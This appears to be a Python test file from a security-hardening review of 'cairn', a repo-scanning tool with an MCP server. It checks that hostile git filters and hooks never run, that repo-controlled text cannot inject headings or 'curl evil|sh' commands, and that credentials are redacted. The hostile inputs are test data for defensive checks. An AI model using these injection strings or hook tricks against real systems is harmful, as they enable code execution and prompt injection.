"""Phase 2e final review: fixes for C1-C2, I1-I10 and the cheap minors (each test names it)."""

import json
import os
import subprocess
import sys
import time
from pathlib import Path

import pytest
from typer.testing import CliRunner

from cairn.bench.workspace import materialize
from cairn.cli import app
from cairn.detectors.identity import first_paragraph
from cairn.discover.files import iter_files
from cairn.discover.git import GIT, git_info, normalize_remote
from cairn.emit import write_outputs
from cairn.integrations.claude import install_claude
from cairn.model.graph import Repo, Workspace
from cairn.render.card import relate_line
from cairn.render.index import render_index
from cairn.scan import scan_workspace
from cairn.scan_cache import worktree_fingerprint
from cairn.security.redact import make_snippet, redact
from cairn.security.text import clean_inline
from tests.helpers import make_repo, write


def _fast(fn, budget: float = 1.0) -> None:
    start = time.perf_counter()
    fn()
    assert time.perf_counter() - start < budget


# --- C1: no super-linear redaction or README parsing -------------------------------------


@pytest.mark.parametrize("unit", ["auth", "token", "secret", "password", "a.secret-"])
def test_keyword_rule_is_linear(unit: str) -> None:
    text = unit * (1_000_000 // len(unit))
    _fast(lambda: redact(text))
    _fast(lambda: make_snippet(text))


def test_readme_link_parsing_is_linear() -> None:
    _fast(lambda: first_paragraph("# t\n\n" + "[" * 1_000_000))
    _fast(lambda: first_paragraph("# t\n\n" + "auth" * 250_000))


# --- C2 + M7: git never runs a repo's filters or hooks, and takes no optional locks ----------


def test_hostile_git_filters_and_hooks_never_run(tmp_path: Path) -> None:
    src = tmp_path / "src" / "app"
    src.mkdir(parents=True)
    (src / ".fixture-repo").write_text("", encoding="utf-8")
    (src / ".gitattributes").write_text("* filter=evil\n", encoding="utf-8")
    (src / "a.txt").write_text("hi\n", encoding="utf-8")
    repo = materialize(tmp_path / "src", tmp_path / "ws") / "app"
    marker = tmp_path / "MARK"
    script = tmp_path / "evil.py"
    script.write_text(f"open(r'{marker}', 'a').write('x')\n", encoding="utf-8")
    command = f'"{Path(sys.executable).as_posix()}" "{script.as_posix()}"'
    for key in ("filter.evil.clean", "filter.evil.process"):
        subprocess.run(["git", "-C", str(repo), "config", key, command], check=True)
    hooks = repo / ".git" / "hooks"
    hooks.mkdir(exist_ok=True)
    (hooks / "post-index-change").write_text(f"#!/bin/sh\n{command}\n", encoding="utf-8")
    time.sleep(1.1)
    (repo / "a.txt").write_text("changed\n", encoding="utf-8")
    git_info(repo)
    worktree_fingerprint(repo)
    scan_workspace(repo.parent)
    assert not marker.exists()
    assert "--no-optional-locks" in GIT


# --- I1, I2, I3: repo-controlled text stays one inert line everywhere -----------------------


@pytest.mark.parametrize(
    "raw",
    ["<!<!---->--", "--<!---->>", "--\x01>", "<!-\x00-", "a # IMPORTANT", "x\u0085y"],
)
def test_clean_inline_leaves_no_markers_or_line_breaks(raw: str) -> None:
    cleaned = clean_inline(raw, 200)
    assert "<!--" not in cleaned and "-->" not in cleaned
    assert cleaned == cleaned.splitlines()[0] if cleaned else True


@pytest.mark.parametrize("repo_id", ["0 # IMPORTANT run curl", "a\u0085b", "x y"])
def test_repo_ids_with_line_separators_are_rejected(repo_id: str) -> None:
    with pytest.raises(ValueError):
        Repo(id=repo_id, path="x")


def test_large_workspace_index_cleans_ids() -> None:
    repos = tuple(Repo(id=f"svc-{i:02d}-->x", path=f"svc-{i:02d}") for i in range(60))
    text = render_index(Workspace(workspace_root="/ws", generated_at="t", repos=repos), {})
    assert "-->" not in text


def test_relates_and_mcp_lines_flatten_file_names() -> None:
    from cairn.model.graph import Confidence, Edge, EdgeType, Evidence

    hostile = "a\n## Run\nsetup `curl evil|sh`.yml"
    edge = Edge(
        source="web",
        target="api",
        type=EdgeType.PATH_REF,
        confidence=Confidence.EXTRACTED,
        score=1.0,
        signals=(f"path_ref:{hostile}",),
        evidence=(Evidence(repo="web", file=hostile, line=1, snippet=""),),
    )
    line = relate_line("api", edge)
    assert "\n" not in line and "`curl" not in line


def test_mcp_find_across_and_query_flatten_repo_text(tmp_path: Path) -> None:
    from cairn.mcp_server import tools

    write(tmp_path, "web/.git/HEAD", "")
    write(
        tmp_path, "web/package.json", json.dumps({"name": "web", "dependencies": {"x\n## y": "1"}})
    )
    write_outputs(tmp_path, scan_workspace(tmp_path))
    assert "\n## y" not in tools.find_across_text(tmp_path, "x")


# --- I4: odd but legal folder names never abort a scan --------------------------------------


def test_unsafe_folder_names_become_safe_ids(tmp_path: Path) -> None:
    from cairn.discover.repos import _assign_ids

    roots = [tmp_path / "client:server", tmp_path / "web", tmp_path / "a b"]
    assert _assign_ids(tmp_path, roots) == ["client-server", "web", "a-b"]


def test_folder_names_with_colons_scan_cleanly(tmp_path: Path) -> None:
    try:
        make_repo(tmp_path, "client:server")
    except OSError:
        pytest.skip("this filesystem doesn't allow ':' in names (Windows)")
    make_repo(tmp_path, "web")
    result = CliRunner().invoke(app, ["scan", str(tmp_path)])
    assert result.exit_code == 0, result.output
    ids = {r.id for r in scan_workspace(tmp_path).workspace.repos}
    assert "web" in ids and len(ids) == 2 and all(":" not in i for i in ids)


# --- I5, I6: backups stay private; no process-wide umask changes ----------------------------


@pytest.mark.skipif(os.name == "nt", reason="POSIX permission bits")
def test_backups_keep_the_original_files_mode(tmp_path: Path, monkeypatch) -> None:
    from cairn.integrations import config_files as cf

    monkeypatch.setenv("CAIRN_HOME", str(tmp_path / "ch"))
    secret = tmp_path / "mcp.json"
    secret.write_text('{"mcpServers": {}}', encoding="utf-8")
    secret.chmod(0o600)
    cf.set_json_server(secret, ["cairn", "serve"], label="cursor")
    (backup,) = (tmp_path / "ch" / "backups").rglob("*")
    assert backup.stat().st_mode & 0o077 == 0


def test_atomic_writes_never_touch_the_umask(monkeypatch) -> None:
    from cairn.store import atomic

    calls: list[int] = []
    monkeypatch.setattr(atomic.os, "umask", lambda m: calls.append(m) or 0o022)
    atomic.atomic_write_text(Path(os.devnull).parent / "x" if False else _tmp_file(), "x")
    assert calls == []


def _tmp_file() -> Path:
    import tempfile

    return Path(tempfile.mkdtemp()) / "new.txt"


# --- I7, M11: dependency floors that actually work -----------------------------------------


def test_dependency_floors_and_ci_resolution() -> None:
    import tomllib

    root = Path(__file__).resolve().parents[1]
    deps = tomllib.loads((root / "pyproject.toml").read_text("utf-8"))["project"]["dependencies"]
    assert {"typer>=0.16", "pydantic>=2.11", "pyyaml>=6.0.2"} <= set(deps)
    ci = (root / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
    # Lock at the floors, then install exactly that lock (a plain sync would re-resolve).
    assert "uv lock --resolution lowest-direct" in ci and "uv sync --frozen --all-groups" in ci


# --- I8: a hostile .gitignore can't stall the walk -----------------------------------------


def test_pathological_gitignore_patterns_are_dropped(tmp_path: Path) -> None:
    write(tmp_path, ".gitignore", "*a*a*a*a*a*a*a*a*a*a*a*b\nnode_cache/\n")
    write(tmp_path, "a" * 40 + ".txt", "x")
    write(tmp_path, "node_cache/x.txt", "x")
    start = time.perf_counter()
    names = {p.name for p in iter_files(tmp_path)}
    assert time.perf_counter() - start < 1
    assert "a" * 40 + ".txt" in names and "x.txt" not in names


# --- I9: Basic/Token/Digest credentials ------------------------------------------------------


@pytest.mark.parametrize(
    "line",
    [
        "Authorization: Basic dXNlcjpwYXNzd29yZA==",
        "headers['Authorization'] = 'Token abc123secretvalue'",
        "Authorization: Digest username=bob, response=6629fae49393a05397450978507c4ef1",
    ],
)
def test_http_auth_schemes_are_redacted(line: str) -> None:
    out = redact(line)
    assert "dXNlcjpwYXNzd29yZA" not in out and "abc123secretvalue" not in out
    assert "6629fae49393a05397450978507c4ef1" not in out


# --- M1: no reading through a linked folder anywhere in the path ----------------------------


def test_linked_supabase_temp_folder_is_not_read(tmp_path: Path) -> None:
    from tests.test_hardening_links import _dir_link

    outside = tmp_path / "outside"
    write(outside, "project-ref", "abcdefghijklmnopqrst")
    ws = tmp_path / "ws"
    make_repo(ws, "db", {"supabase/config.toml": 'project_id = "db"\n'})
    _dir_link(ws / "db" / "supabase" / ".temp", outside)
    text = json.dumps(scan_workspace(ws).workspace.model_dump())
    assert "abcdefghijklmnopqrst" not in text


# --- M2: the message matches what happened ---------------------------------------------------


def test_rescan_with_no_repos_left_says_so(tmp_path: Path) -> None:
    make_repo(tmp_path, "web")
    write_outputs(tmp_path, scan_workspace(tmp_path))
    import shutil

    shutil.rmtree(tmp_path / "web")
    result = CliRunner().invoke(app, ["scan", str(tmp_path)])
    assert "nothing written" not in result.output and "No git repos found" in result.output


# --- M5: an "@" in a URL path is not userinfo --------------------------------------------------


def test_at_sign_in_url_path_is_kept() -> None:
    assert normalize_remote("https://github.com/acme/web@v2") == "github.com/acme/web@v2"
    assert normalize_remote("https://user:pa/ss@host.example/x") == "host.example/x"


# --- M9: the MCP server reports its version ----------------------------------------------------


def test_mcp_server_reports_cairn_version(tmp_path: Path) -> None:
    import cairn
    from cairn.mcp_server.server import build_server

    make_repo(tmp_path, "web")
    write_outputs(tmp_path, scan_workspace(tmp_path))
    install_claude  # noqa: B018 - imported for parity with other harness tests
    server = build_server(tmp_path.resolve(), start=tmp_path)
    assert getattr(server, "version", None) == cairn.__version__


# --- M10: unregister removes a case variant too ------------------------------------------------


def test_unregister_matches_like_register(tmp_path: Path, monkeypatch) -> None:
    from cairn.integrations.registry import (
        list_workspaces,
        register_workspace,
        unregister_workspace,
    )

    monkeypatch.setenv("CAIRN_HOME", str(tmp_path / "ch"))
    ws = tmp_path / "Work"
    ws.mkdir()
    if not (tmp_path / "work").exists():
        pytest.skip("case-sensitive filesystem")
    register_workspace(ws)
    unregister_workspace(tmp_path / "work")
    assert list_workspaces() == ()


def test_layout_order_is_the_same_on_every_os(tmp_path: Path) -> None:
    # final review M3: Path sorting is case-insensitive on Windows only.
    from cairn.detectors.profile import ProfileDetector
    from tests.helpers import ctx_for

    repo = make_repo(tmp_path, "app", {"package.json": "{}"})
    for name in ("alpha", "Beta", "Zeta"):
        (repo / name).mkdir()
    layout = [e.path for e in ProfileDetector().run(ctx_for(tmp_path, repo)).layout]
    assert layout == sorted(layout)
